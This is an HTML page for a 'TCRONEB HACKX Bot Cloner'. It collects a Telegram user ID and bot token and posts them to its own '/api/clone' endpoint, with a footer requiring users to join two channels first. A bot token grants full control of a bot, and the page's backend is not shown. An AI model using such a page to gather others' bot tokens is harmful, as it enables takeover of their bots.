<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Clone Bot | TCRONEB HACKX</title>
  <style>
    body {
      font-family: monospace;
      background: #121212;
      color: #00ffcc;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    h1 {
      font-size: 2rem;
      margin-bottom: 1rem;
      color: #00ffee;
    }
    form {
      background: #1e1e1e;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px #00ffcc;
      width: 300px;
    }
    input {
      width: 100%;
      margin-bottom: 10px;
      padding: 10px;
      border: none;
      background: #000;
      color: #00ffcc;
      border: 1px solid #00ffcc;
      border-radius: 4px;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #00ffcc;
      border: none;
      color: #000;
      font-weight: bold;
      cursor: pointer;
      border-radius: 4px;
    }
    .footer {
      margin-top: 20px;
      font-size: 0.8rem;
      text-align: center;
      color: #888;
    }
  </style>
</head>
<body>
  <h1>TCRONEB HACKX Bot Cloner</h1>

  <form id="cloneForm">
    <input type="text" name="user_id" placeholder="Your Telegram User ID" required />
    <input type="text" name="bot_token" placeholder="Your Bot Token" required />
    <button type="submit">Clone My Bot</button>
    <div id="status"></div>
  </form>

  <div class="footer">
    You must join @deployed_bots and @YourSecondChannel before cloning.
  </div>

  <script>
    document.getElementById('cloneForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const form = e.target;
      const user_id = form.user_id.value.trim();
      const bot_token = form.bot_token.value.trim();
      const status = document.getElementById('status');
      status.innerText = 'Cloning your bot...';

      const res = await fetch('/api/clone', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ user_id, bot_token })
      });

      const result = await res.json();
      if (result.ok) {
        status.innerText = `✅ Bot @${result.bot} cloned and working!`;
      } else {
        status.innerText = `❌ Error: ${result.error || 'Something went wrong'}`;
      }
    });
  </script>
</body>
</html>
